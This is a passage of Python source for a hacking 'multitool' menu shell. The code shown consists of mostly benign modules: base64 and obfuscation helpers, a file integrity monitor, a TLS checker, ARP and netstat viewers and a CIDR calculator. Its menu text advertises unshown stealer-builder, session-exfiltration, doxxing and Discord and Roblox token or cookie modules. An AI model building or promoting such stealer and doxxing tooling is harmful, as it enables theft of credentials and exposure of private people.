            print(f"\n{Colors.GREEN}Transformation Complete Payload String:{Colors.RESET}")
            print(f"{Colors.BOLD}{converted_base64_bytes.decode('utf-8')}{Colors.RESET}")
    elif operational_flag == 'D':
        obfuscated_base64_input = input("\nEnter base64 formatted code array string to translate: ")
        try:
            translated_cleartext_bytes = base64.b64decode(obfuscated_base64_input.encode('utf-8'))
            if ui is not None:
                ui.panel(translated_cleartext_bytes.decode('utf-8'), title="De-obfuscated Cleartext", border_style="green")
            else:
                print(f"\n{Colors.GREEN}De-obfuscated Restored Cleartext Data String:{Colors.RESET}")
                print(f"{Colors.BOLD}{translated_cleartext_bytes.decode('utf-8')}{Colors.RESET}")
        except Exception as payload_error:
            print(f"\n{Colors.RED}[!] Formatting Failure: Sequence is not a standard Base64 structure: {payload_error}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nPress Enter to reset active console workspace...")


def _python_obfuscator_wrapper():
    try:
        from core.etc.obfuscator import PythonObfuscator
        if ui is not None:
            ui.section("MODULE 06 // PYTHON CODE OBFUSCATOR", "green")
            input_path = ui.prompt_input("Python file path to obfuscate:")
        else:
            print(f"\n{Colors.GREEN}[MODULE 06 // PYTHON CODE OBFUSCATOR]{Colors.RESET}")
            input_path = input("Python file path to obfuscate: ").strip()
        if not input_path or not os.path.exists(input_path):
            if ui is not None:
                ui.error("File not found.")
            else:
                print(f"{Colors.RED}[!] File not found.{Colors.RESET}")
            input("Press Enter to return...")
            return
        obfuscator = PythonObfuscator()
        obfuscator.obfuscate_file(input_path)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Python Obfuscator")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _python_deobfuscator_wrapper():
    try:
        from core.etc.deobfuscator import PythonDeobfuscator
        if ui is not None:
            ui.section("MODULE 07 // PYTHON CODE DEOBFUSCATOR", "green")
            input_path = ui.prompt_input("Python file path to deobfuscate:")
        else:
            print(f"\n{Colors.GREEN}[MODULE 07 // PYTHON CODE DEOBFUSCATOR]{Colors.RESET}")
            input_path = input("Python file path to deobfuscate: ").strip()
        if not input_path or not os.path.exists(input_path):
            if ui is not None:
                ui.error("File not found.")
            else:
                print(f"{Colors.RED}[!] File not found.{Colors.RESET}")
            input("Press Enter to return...")
            return
        deobfuscator = PythonDeobfuscator()
        deobfuscator.deobfuscate_file(input_path)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Python Deobfuscator")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def run_file_integrity_monitor():

    if ui is not None: ui.section("MODULE 01 // LOCAL FILE INTEGRITY MONITOR (FIMS)", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 01 // LOCAL FILE INTEGRITY MONITOR (FIMS)]{Colors.RESET}")
    target_dir = (ui.prompt_input("Enter target folder directory path to snapshot [Default: '.']:", ".")
                  if ui is not None else input("\nEnter target folder directory path to snapshot [Default = '.']: ").strip() or ".")
    if not os.path.exists(target_dir):
        print(f"{Colors.RED}[!] Error: Target filesystem path unresolvable.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    manifest_file = "fims_manifest.json"
    current_hashes = {}
    
    print(f"\n{Colors.GREEN}Hashing directory structures concurrently...{Colors.RESET}")
    for root, _, filenames in os.walk(target_dir):
        for filename in filenames:
            absolute_path = os.path.join(root, filename)
            try:
                sha_hasher = hashlib.sha256()
                with open(absolute_path, 'rb') as f:
                    for buffer_chunk in iter(lambda: f.read(4096), b''):
                        sha_hasher.update(buffer_chunk)
                current_hashes[absolute_path] = sha_hasher.hexdigest()
            except Exception:
                pass
                
    if not os.path.exists(manifest_file):
        try:
            with open(manifest_file, 'w', encoding='utf-8') as f:
                json.dump(current_hashes, f, indent=4)
            print(f"\n{Colors.GREEN}[+] BASELINE DATABASE COMPILED ({len(current_hashes)} FILES INDEXED){Colors.RESET}")
        except Exception as err:
            print(f"{Colors.RED}[!] Database export failure: {err}{Colors.RESET}")
    else:
        print(f"{Colors.AMBER}[!] Found existing baseline. Cross-referencing folder metadata changes...{Colors.RESET}\n")
        try:
            with open(manifest_file, 'r', encoding='utf-8') as f:
                baseline_hashes = json.load(f)
                
            added_files = [p for p in current_hashes if p not in baseline_hashes]
            deleted_files = [p for p in baseline_hashes if p not in current_hashes]
            modified_files = [p for p in current_hashes if p in baseline_hashes and current_hashes[p] != baseline_hashes[p]]
            
            print(f"{Colors.BOLD}INTEGRITY SCAN REPORT:{Colors.RESET}")
            print("-" * 75)
            print(f"  Active Monitored Items : {len(current_hashes)}")
            print(f"  Untracked New Additions: {Colors.AMBER}{len(added_files)}{Colors.RESET}")
            print(f"  Missing Deleted Items  : {Colors.RED}{len(deleted_files)}{Colors.RESET}")
            print(f"  Modified Data Signatures: {Colors.RED}{len(modified_files)}{Colors.RESET}")
            print("-" * 75)
            
            for p in added_files: print(f"  {Colors.GREEN}[NEW FILE]{Colors.RESET} {p}")
            for p in deleted_files: print(f"  {Colors.RED}[DELETED]{Colors.RESET} {p}")
            for p in modified_files: print(f"  {Colors.RED}[MODIFIED]{Colors.RESET} {p}")
            
            sync_permission = input("\nOverwrite baseline manifest database with current state mapping? (Y/N): ").strip().upper()
            if sync_permission == 'Y':
                with open(manifest_file, 'w', encoding='utf-8') as f:
                    json.dump(current_hashes, f, indent=4)
                print(f"{Colors.GREEN}[+] Snapshot database registry synchronized.{Colors.RESET}")
        except Exception as sync_err:
            print(f"{Colors.RED}[!] Failed to complete workspace integrity comparison: {sync_err}{Colors.RESET}")
            
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_ssl_auditor():

    import ssl
    if ui is not None: ui.section("MODULE 02 // SSL/TLS CERTIFICATE & CIPHER SUITE AUDITOR", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 02 // SSL/TLS CERTIFICATE & CIPHER SUITE AUDITOR]{Colors.RESET}")
    target_host = input("\nEnter target host machine domain string (e.g., encrypted.com): ").strip()
    if not target_host:
        return
        
    port = 443
    print(f"\n{Colors.GREEN}Initiating production TLS connection handshake stream...{Colors.RESET}")
    try:
        ssl_context = ssl.create_default_context()
        base_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        base_socket.settimeout(4.5)
        
        secure_socket = ssl_context.wrap_socket(base_socket, server_hostname=target_host)
        secure_socket.connect((target_host, port))
        
        negotiated_cipher = secure_socket.cipher()
        peer_certificate = secure_socket.getpeercert()
        secure_socket.close()
        
        print(f"\n{Colors.GREEN}[+] TELEMETRY DISCOVERED // SUCCESSFUL SECURE DISCOVERY HANDSHAKE{Colors.RESET}")
        print("-" * 75)
        print(f"  -> Active Cipher Suite: {Colors.CYAN}{negotiated_cipher[0]}{Colors.RESET} ({negotiated_cipher[1]} Protocol Build)")
        
        if peer_certificate:
            from datetime import datetime, timezone
            expiration_string = peer_certificate.get('notAfter')
            if expiration_string:
                try:
                    expiry_date = datetime.strptime(expiration_string, '%b %d %H:%M:%S %Y %Z')
                    remaining_days = (expiry_date - datetime.now(timezone.utc).replace(tzinfo=None)).days
                    status_color = Colors.GREEN if remaining_days > 30 else Colors.RED
                    print(f"  -> Expiration Limit  : {expiration_string} ({status_color}{remaining_days} Days Remaining{Colors.RESET})")
                except Exception:
                    print(f"  -> Expiration Limit  : {expiration_string}")
                    
            subject_dict = dict(x[0] for x in peer_certificate.get('subject', []))
            print(f"  -> Certificate Owner : {subject_dict.get('commonName', 'N/A')}")
            issuer_dict = dict(x[0] for x in peer_certificate.get('issuer', []))
            print(f"  -> Cert Authority    : {issuer_dict.get('organizationName', 'N/A')}")
    except Exception as tls_err:
        print(f"\n{Colors.RED}[!] Secure Telemetry Handshake Terminated: Connection failure: {tls_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_connection_profiler():

    if ui is not None: ui.section("MODULE 03 // HOST ACTIVE NETWORK CONNECTION & LISTENING PORT PROFILER", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 03 // HOST ACTIVE NETWORK CONNECTION & LISTENING PORT PROFILER]{Colors.RESET}")
    
    is_windows = sys.platform.startswith('win')
    cmd_arguments = ['netstat', '-ano'] if is_windows else ['ss', '-tuln']
    
    print(f"\n{Colors.GREEN}Executing native administrative subprocess network layer queries...{Colors.RESET}\n")
    print("-" * 75)
    
    try:
        subprocess_result = subprocess.run(cmd_arguments, capture_output=True, text=True, errors='ignore')
        output_rows = subprocess_result.stdout.splitlines()
        
        for row in output_rows[:45]:
            print(row)
        if len(output_rows) > 45:
            print(f"\n{Colors.AMBER}[...] Output truncated. Total connection descriptors log count: {len(output_rows)} lines.{Colors.RESET}")
    except Exception as exec_err:
        print(f"{Colors.RED}[!] Subprocess execution dropped: Target utility failed: {exec_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_password_auditor():

    if ui is not None: ui.section("MODULE 04 // PASSWORD COMPLEXITY & OFFLINE INFORMATION ENTROPY SCANNERS", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 04 // PASSWORD COMPLEXITY & OFFLINE INFORMATION ENTROPY SCANNERS]{Colors.RESET}")
    target_pwd = input("\nEnter credential string value to audit: ").strip()
    if not target_pwd:
        return
        
    string_length = len(target_pwd)
    has_upper = any(c.isupper() for c in target_pwd)
    has_lower = any(c.islower() for c in target_pwd)
    has_digit = any(c.isdigit() for c in target_pwd)
    has_special = any(not c.isalnum() for c in target_pwd)
    
    character_pool = 0
    if has_lower: character_pool += 26
    if has_upper: character_pool += 26
    if has_digit: character_pool += 10
    if has_special: character_pool += 32
    
    calculated_entropy = 0.0
    if character_pool > 0:
        calculated_entropy = math.log2(character_pool) * string_length
        
    print(f"\n{Colors.BOLD}INFORMATION THEORY AUDIT PARAMETERS:{Colors.RESET}")
    print("-" * 75)
    print(f"  -> Character Length Metric: {string_length} glyph elements")
    print(f"  -> Flag Allocations Array : Upper={has_upper}, Lower={has_lower}, Num={has_digit}, Symbol={has_special}")
    print(f"  -> Alphabet Complexity Pool: {character_pool} unique configuration variants")
    print(f"  -> Evaluated Entropy Rank  : {calculated_entropy:.4f} bits of information space density")
    print("-" * 75)
    
    if calculated_entropy < 40.0:
        print(f"  Analysis Verdict : {Colors.RED}[!!!] WEAK STRUCTURE // PASS PHRASE COMPROMISE RISK{Colors.RESET}")
    elif calculated_entropy < 70.0:
        print(f"  Analysis Verdict : {Colors.AMBER}[!] REGULAR PROFILE // STRENGTHENING RECOMMENDED{Colors.RESET}")
    else:
        print(f"  Analysis Verdict : {Colors.GREEN}[+] HIGH DENSITY RUGGED BASELINE STABLE PROFILE{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_arp_profiler():

    if ui is not None: ui.section("MODULE 05 // LOCAL NETWORK ARP TABLE CACHE PROFILER & DUPLICATE MAC AUDITOR", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 05 // LOCAL NETWORK ARP TABLE CACHE PROFILER & DUPLICATE MAC AUDITOR]{Colors.RESET}")
    time.sleep(0.5)

    is_windows = sys.platform.startswith('win')
    cmd_arguments = ['arp', '-a']
    
    print(f"\n{Colors.GREEN}Invoking administrative hardware resolution cache tables...{Colors.RESET}\n")
    print(f"{Colors.BOLD}{'LOCAL IP COMPONENT':<24}{'PHYSICAL HARDWARE ADDRESS (MAC)':<26}{'ALLOCATION STATE'}{Colors.RESET}")
    print("-" * 75)

    try:
        process_result = subprocess.run(cmd_arguments, capture_output=True, text=True, errors='ignore')
        output_lines = process_result.stdout.splitlines()
        
        mac_registry = {}
        arp_entries_found = 0

        ip_pattern = re.compile(r'(?:[0-9]{1,3}\.){3}[0-9]{1,3}')
        mac_pattern = re.compile(r'(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}')

        for line in output_lines:
            found_ip = ip_pattern.search(line)
            found_mac = mac_pattern.search(line)
            
            if found_ip and found_mac:
                arp_entries_found += 1
                ip_str = found_ip.group(0)
                mac_str = found_mac.group(0).lower().replace('-', ':')
                
                allocation_type = "STATIC" if "static" in line.lower() else "DYNAMIC"
                
                print(f"  {ip_str:<22}{mac_str:<26}{allocation_type}")
                
                if mac_str not in mac_registry:
                    mac_registry[mac_str] = []
                mac_registry[mac_str].append(ip_str)

        print("-" * 75)
        print(f"[+] Active hardware address caches analyzed: {arp_entries_found} network bindings mapped.")
        
        anomalies_detected = 0
        for mac, ip_list in mac_registry.items():
            if len(ip_list) > 1 and mac != "ff:ff:ff:ff:ff:ff" and not mac.startswith("224.") and not mac.startswith("239."):
                anomalies_detected += 1
                print(f"\n{Colors.RED}[!] WARNING // DUPLICATE HARDWARE MAPPING DETECTED{Colors.RESET}")
                print(f"  Physical Hardware ID: {Colors.AMBER}{mac}{Colors.RESET}")
                print(f"  Conflicting IP Nodes: {Colors.CYAN}{', '.join(ip_list)}{Colors.RESET}")

        if anomalies_detected == 0:
            print(f"{Colors.GREEN}[+] Layer 2 Security Status Baseline: Clean. No physical node overlap caught.{Colors.RESET}")

    except Exception as err:
        print(f"{Colors.RED}[!] Subprocess lookup execution error tracking table allocations: {err}{Colors.RESET}")

    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_cidr_calculator():

    if ui is not None: ui.section("MODULE 06 // CIDR SUBNET IPV4 NETWORK RANGE & MASK CALCULATOR", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 06 // CIDR SUBNET IPV4 NETWORK RANGE & MASK CALCULATOR]{Colors.RESET}")
    cidr_input = input("\nEnter target IPv4 CIDR address block (e.g., 192.168.1.0/24): ").strip()
    if not cidr_input or "/" not in cidr_input:
        print(f"{Colors.RED}[!] Format Check Error: String must follow standard CIDR prefix conventions.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    ip_part, prefix_str = cidr_input.split("/")
    try:
        prefix = int(prefix_str)
        if prefix < 0 or prefix > 32:
            raise ValueError()
    except ValueError:
        print(f"{Colors.RED}[!] Mask Validation Error: CIDR prefix mask value must rest between 0 and 32.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    try:
        ip_octets = [int(o) for o in ip_part.split(".")]
        if len(ip_octets) != 4 or any(o < 0 or o > 255 for o in ip_octets):
            raise ValueError()
    except ValueError:
        print(f"{Colors.RED}[!] Invalid IP address format.{Colors.RESET}")
        time.sleep(1.2)
        return


    raw_ip_bits = (ip_octets[0] << 24) + (ip_octets[1] << 16) + (ip_octets[2] << 8) + ip_octets[3]
    raw_mask_bits = (0xFFFFFFFF >> (32 - prefix)) << (32 - prefix) if prefix > 0 else 0
    raw_wildcard_bits = ~raw_mask_bits & 0xFFFFFFFF
    
    raw_network_bits = raw_ip_bits & raw_mask_bits
    raw_broadcast_bits = raw_network_bits | raw_wildcard_bits
    
    def bits_to_quad_string(bits):
        return f"{(bits >> 24) & 0xFF}.{(bits >> 16) & 0xFF}.{(bits >> 8) & 0xFF}.{bits & 0xFF}"
        
    total_hosts = 2**(32 - prefix)
    assignable_hosts = total_hosts - 2 if prefix < 31 else 0
    
    print(f"\n{Colors.GREEN}[+] INTERFACE CIDR METRIC CONFIGURATIONS ARCHIVE{Colors.RESET}")
    print("-" * 75)
    print(f"  -> Provided Block Target : {Colors.CYAN}{cidr_input}{Colors.RESET}")
    print(f"  -> Subnet Mask Dotted    : {bits_to_quad_string(raw_mask_bits)}")
    print(f"  -> Inverse Wildcard Mask : {bits_to_quad_string(raw_wildcard_bits)}")
    print(f"  -> Network Address Layer : {Colors.AMBER}{bits_to_quad_string(raw_network_bits)}{Colors.RESET}")
    print(f"  -> Broadcast Address Node: {Colors.AMBER}{bits_to_quad_string(raw_broadcast_bits)}{Colors.RESET}")
    if prefix < 31:
        print(f"  -> Usable IP Host Range  : {bits_to_quad_string(raw_network_bits + 1)} - {bits_to_quad_string(raw_broadcast_bits - 1)}")
    else:
        print("  -> Usable IP Host Range  : N/A (Point-to-Point / Loopback Allocation Segment)")
    print(f"  -> Usable Endpoint Count : {Colors.GREEN}{assignable_hosts}{Colors.RESET} active assignable addresses ({total_hosts} total bits block)")
    
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_upnp_discovery():

    if ui is not None: ui.section("MODULE 07 // UPnP SSDP LOCAL LAN SMART DEVICE DISCOVERY EXPLORER", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 07 // UPnP SSDP LOCAL LAN SMART DEVICE DISCOVERY EXPLORER]{Colors.RESET}")
    print("Sends an unauthenticated UDP multicast discover frame to identify hidden endpoints and UPnP mappings.")
    if input("Initialize local network UPnP multicast sweep? (Y/N): ").strip().upper() != 'Y':
        return
        
    print(f"\n{Colors.GREEN}Broadcasting custom SSDP request payload to multicast group 239.255.255.250:1900...{Colors.RESET}\n")
    ssdp_request_payload = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 2\r\n"
        "ST: ssdp:all\r\n\r\n"
    ).encode('utf-8')
    
    try:

        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        udp_socket.settimeout(2.5)
        udp_socket.sendto(ssdp_request_payload, ("239.255.255.250", 1900))
        
        uncovered_appliances = set()
        while True:
            try:
                packet_data, remote_address = udp_socket.recvfrom(4096)
                device_ip = remote_address[0]
                if device_ip not in uncovered_appliances:
                    uncovered_appliances.add(device_ip)
                    print(f"  {Colors.GREEN}[+] RESPONSIVE APPLIANCE DISCOVERED{Colors.RESET} Node Location IP: {Colors.CYAN}{device_ip}{Colors.RESET}")
            except socket.timeout:
                break
        udp_socket.close()
        print(f"\nSubnet sweep finalized. Total unique discoverable UPnP nodes tracked: {Colors.GREEN}{len(uncovered_appliances)}{Colors.RESET}")
    except Exception as socket_err:
        print(f"{Colors.RED}[!] Failed to open local network UDP multicast sockets framework: {socket_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nSweep complete. Press Enter to pull up sub-directory options...")

def run_dns_spoof_auditor():

    if ui is not None: ui.section("MODULE 08 // LOCAL HOSTS FILE DNS SPOOFING & CACHE POISONING AUDITOR", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 08 // LOCAL HOSTS FILE DNS SPOOFING & CACHE POISONING AUDITOR]{Colors.RESET}")
    print("Parses local static configuration tables to flag hidden IP redirections overriding nameservers.")
    
    target_hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if os.name == "nt" else "/etc/hosts"
    print(f"Target system configuration lookup location: {Colors.CYAN}{target_hosts_path}{Colors.RESET}\n")
    
    if not os.path.exists(target_hosts_path):
        print(f"{Colors.RED}[!] File Audit Error: Static lookup configuration path unresolvable on this build.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
        
    try:
        active_redirection_entries = 0
        with open(target_hosts_path, 'r', encoding='utf-8', errors='ignore') as hosts_file:
            for text_line_num, line_string in enumerate(hosts_file, 1):
                sanitized_row = line_string.strip()
                if sanitized_row and not sanitized_row.startswith("#"):
                    active_redirection_entries += 1
                    print(f"  {Colors.AMBER}[STATIC EXPOSURE OVERRIDE FOUND]{Colors.RESET} Line {text_line_num}: {Colors.CYAN}{sanitized_row}{Colors.RESET}")
                    
        print("-" * 75)
        if active_redirection_entries == 0:
            print(f"{Colors.GREEN}[+] Static redirection database baseline is nominal and clear.{Colors.RESET}")
            print("    No override mappings detected overriding default DNS resolution records.")
        else:
            print(f"\n{Colors.AMBER}[!] Review target lines above to ensure entries are authorized.{Colors.RESET}")
            print("    Custom static parameters override systemic DNS nameserver queries entirely.")
    except Exception as unmanaged_io_err:
        print(f"{Colors.RED}[!] Failed to acquire unmanaged read handles against system infrastructure file: {unmanaged_io_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nAudit completed. Press Enter to load sub-directory options...")

def run_mac_vendor_lookup():

    if ui is not None: ui.section("MODULE 09 // MAC ADDRESS OUI VENDOR DIRECTORY LOOKUP ENGINE", "cyan")
    else: print(f"\n{Colors.GREEN}[MODULE 09 // MAC ADDRESS OUI VENDOR DIRECTORY LOOKUP ENGINE]{Colors.RESET}")
    input_mac = input("\nEnter hardware MAC address to profile (e.g., 3C:5A:B4:FF:11:22): ").strip().upper()
    if not input_mac:
        return
        
    purified_mac = re.sub(r'[^0-9A-F]', '', input_mac)
    if len(purified_mac) < 6:
        print(f"{Colors.RED}[!] Format Validation Error: Incomplete physical identifier payload layout.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    oui_prefix = purified_mac[:6]
    formatted_oui = f"{oui_prefix[0:2]}:{oui_prefix[2:4]}:{oui_prefix[4:6]}"
    

    offline_oui_cache = {
        "00:05:69": "VMware, Inc.",
        "00:0C:29": "VMware, Inc.",
        "00:1C:42": "Parallels, Inc.",
        "00:50:56": "VMware, Inc.",
        "3C:5A:B4": "Google, LLC",
        "00:16:3E": "Xen Project / Red Hat",
        "52:54:00": "QEMU Virtual NIC",
        "00:17:FA": "Apple, Inc.",
        "00:1E:C2": "Apple, Inc.",
        "A4:77:33": "Apple, Inc.",
        "00:1A:11": "Google, LLC",
        "D8:3A:DD": "GIGA-BYTE Technology Co., Ltd.",
        "E4:54:E8": "Dell Inc.",
        "00:14:22": "Dell Inc.",
        "00:25:90": "Super Micro Computer, Inc.",
        "00:15:5D": "Microsoft Corporation (Hyper-V)"
    }
    
    print(f"\n{Colors.GREEN}Analyzing physical allocation signatures for OUI prefix: {formatted_oui}...{Colors.RESET}")
    
    resolved_vendor = offline_oui_cache.get(formatted_oui)
    if resolved_vendor:
        if ui is not None:
            ui.result_table("OUI VENDOR LOOKUP", ["FIELD", "VALUE"], [
                ("Hardware OUI Prefix", formatted_oui),
                ("Resolved Core Base", f"[green]{resolved_vendor}[/green]"),
                ("Resolution Layer", "Local Static Cache Index Registry (Offline Success)"),
            ], border_style="green")
        else:
            print(f"  -> Hardware OUI Prefix: {formatted_oui}")
            print(f"  -> Resolved Core Base : {Colors.GREEN}{resolved_vendor}{Colors.RESET}")
            print(f"  -> Resolution Layer   : Local Static Cache Index Registry (Offline Success)")
    else:
        if ui is not None:
            ui.warning("Prefix absent from offline cache matrix. Dispatching API request to macvendors.com...")
        else:
            print(f"{Colors.CYAN}Prefix absent from offline cache matrix. Dispatching API request to macvendors.com...{Colors.RESET}")
        url = f"https://api.macvendors.com/{formatted_oui}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
        try:
            with urllib.request.urlopen(req, timeout=8) as response:
                api_vendor = response.read().decode('utf-8').strip()
                if ui is not None:
                    ui.result_table("OUI VENDOR LOOKUP", ["FIELD", "VALUE"], [
                        ("Hardware OUI Prefix", formatted_oui),
                        ("Resolved Core Base", f"[green]{api_vendor}[/green]"),
                        ("Resolution Layer", "Real-Time Distributed API Registry (Online Success)"),
                    ], border_style="cyan")
                else:
                    print(f"\n  -> Hardware OUI Prefix: {formatted_oui}")
                    print(f"  -> Resolved Core Base : {Colors.GREEN}{api_vendor}{Colors.RESET}")
                    print(f"  -> Resolution Layer   : Real-Time Distributed API Registry (Online Success)")
        except urllib.error.HTTPError as err:
            if ui is not None:
                ui.error(f"OUI Registry Unresolved: Prefix is absent from verified international indices (HTTP {err.code})")
            else:
                print(f"\n{Colors.RED}[!] OUI Registry Unresolved: Prefix is absent from verified international indices.{Colors.RESET}")
        except Exception as e:
            if ui is not None:
                ui.error(f"Streaming link connection timeout: {e}")
            else:
                print(f"\n{Colors.RED}[!] Streaming link connection timeout: Defaulting to unknown manufacturer state: {e}{Colors.RESET}")
    
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")


_HELP_TEXT = """
  help      - Clear terminal and redraw the main menu matrix
  tools     - Execute specific security testing subsystem
  credits   - Display engine branding and developer information
  customize - Open dynamic UI theme configuration
  clear     - Wipe scrollback buffer and lock menu frame to top
  exit      - Gracefully terminate active control session
"""

_TOOLS_TEXT = """
  [01] Network Recon     - Port scanner, banner grabber, and subnet discovery tools
  [02] OSINT Profilers   - Username, phone, email, breach, name, image, domain, and threat intel
  [03] Traffic Auditor   - Packet sniffing, local payload analyzer, hashing, obfuscation tools
  [04] Integrity Audits  - Firewall verification, permission audit, and exploit checks
  [05] Vector Framework  - Payload generator, active testing routines, and exploit suite
  [06] Discord Suite     - Token info, webhook tools, server tools, nitro checker
  [07] Dox Tools      - IP tools, OSINT, generators, links, and dark web bookmarks
  [08] Stealer Builder   - Payload generation, session exfil, browser/wallet/game data
  [09] Roblox Suite      - Cookie intelligence, user/group/game lookups
  """

_CREDITS_TEXT = """
  T H I S   T O O L    I S     M A D E    B Y    Y X U R I I

  yxurii / mainframe v6.0 | Multi-Core Security Testing Engine
  Developer : yxurii
  YouTube   : https://www.youtube.com/@kydn-iu5kd
  GitHub    : https://github.com/kayden765
  UC        : https://www.unknowncheats.me/forum/members/5534606.html
  Discord   : dsefg6924 (Server: discord.gg/FHaGEdHswv)
  """

CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins", "credentials.txt")


def _derive_secret(secret, salt_hex):

    salt = bytes.fromhex(salt_hex)
    return hashlib.pbkdf2_hmac('sha256', secret.encode('utf-8'), salt, 100000).hex()


def setup_or_login():

    if not os.path.exists(CREDS_FILE):
        os.makedirs(os.path.dirname(CREDS_FILE), exist_ok=True)

    migrate = False
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, "r") as f:
            record = f.read().strip()
        parts = record.split(":")
        if len(parts) == 2:

            legacy_user, legacy_pass = parts
            salt_hex = os.urandom(16).hex()
            with open(CREDS_FILE, "w") as f:
                f.write(f"{salt_hex}:{_derive_secret(legacy_user, salt_hex)}:{_derive_secret(legacy_pass, salt_hex)}")
            salt_hex, saved_user_hash, saved_pw_hash = salt_hex, _derive_secret(legacy_user, salt_hex), _derive_secret(legacy_pass, salt_hex)
        elif len(parts) == 3:
            salt_hex, saved_user_hash, saved_pw_hash = parts
        else:
            print("[!] Credentials file corrupted. Recreating account.")
            os.remove(CREDS_FILE)
            salt_hex = saved_user_hash = saved_pw_hash = None
    else:
        salt_hex = saved_user_hash = saved_pw_hash = None

    if salt_hex is None:
        print("[!] No local user file detected. Create account:")
        new_user = input("Username: ").strip()
        new_pass = getpass("Password: ").strip()
        if not new_user or not new_pass:
            print("[!] Username and password cannot be empty.\n")
            return setup_or_login()
        salt_hex = os.urandom(16).hex()
        with open(CREDS_FILE, "w") as f:
            f.write(f"{salt_hex}:{_derive_secret(new_user, salt_hex)}:{_derive_secret(new_pass, salt_hex)}")
        print("\nAccount created and saved to logins/credentials.txt.\n")
        with open(CREDS_FILE, "r") as f:
            _, saved_user_hash, saved_pw_hash = f.read().strip().split(":")

    while True:
        username_input = input("login as: ").strip()
        password_input = getpass(f"{username_input}@127.0.0.1's password: ").strip()
        if (_derive_secret(username_input, salt_hex) == saved_user_hash and
                _derive_secret(password_input, salt_hex) == saved_pw_hash):
            return username_input
        print("[!] Access denied. Incorrect username or password.\n")



def _render_home():

    if ui is not None:
        ui.clear()
    else:
        print(Colors.CLEAR_SCREEN, end="")
    if show_theme is not None:
        show_theme(_CURRENT_THEME)
    print(f'Type {Colors.CYAN}help{Colors.RESET} for a list of available commands.\n')


import urllib.request
import urllib.error
import json
import os
import tempfile
import shutil

def handle_category_deck(deck_id):

    prompts = {
        "1": "mainframe@network_cores:~# ",
        "2": "mainframe@osint_engines:~# ",
        "3": "mainframe@local_utilities:~# ",
        "4": "mainframe@advanced_audits:~# ",
        "5": "mainframe@attack_vectors:~# ",
        "6": "mainframe@discord_tools:~# ",
        "7": "mainframe@dox_tools:~# ",
        "8": "mainframe@stealer_builder:~# ",
        "9": "mainframe@roblox_tools:~# ",
    }
    prompt = prompts.get(deck_id, "mainframe:~# ")
    colors = {
        "1": Colors.BOLD + Colors.YELLOW,
        "2": Colors.BOLD + Colors.CYAN,
        "3": Colors.BOLD + Colors.GREEN,
        "4": Colors.BOLD + Colors.MAGENTA,
        "5": Colors.BOLD + Colors.RED,
        "6": Colors.BOLD + Colors.BLUE,
        "7": Colors.BOLD + Colors.WHITE,
        "8": Colors.BOLD + Colors.RED,
        "9": Colors.BOLD + Colors.GREEN,
    }
    tcolor = colors.get(deck_id, Colors.BOLD)

    while True:
        if ui is not None:
            ui.clear()
        else:
            print(Colors.CLEAR_SCREEN, end="")
        

        if deck_id == "1":
            MainframeUI.display_network_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold yellow]mainframe@network_cores:~# [ESC to return][/bold yellow] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@network_cores:~# [ESC to return] {Colors.RESET}")
            
            if not _run_tool(deck_id, operator_input):
                break
                



        elif deck_id == "2":
            MainframeUI.display_osint_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold cyan]mainframe@osint_engines:~# [ESC to return][/bold cyan] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@osint_engines:~# [ESC to return] {Colors.RESET}")
            
            if not _run_tool(deck_id, operator_input):
                break
                



        elif deck_id == "3":
            MainframeUI.display_utilities_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold green]mainframe@local_utilities:~# [ESC to return][/bold green] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@local_utilities:~# [ESC to return] {Colors.RESET}")
            
            if not _run_tool(deck_id, operator_input):
                break


        elif deck_id == "4":
            MainframeUI.display_advanced_audits_menu()
            if ui is not None:
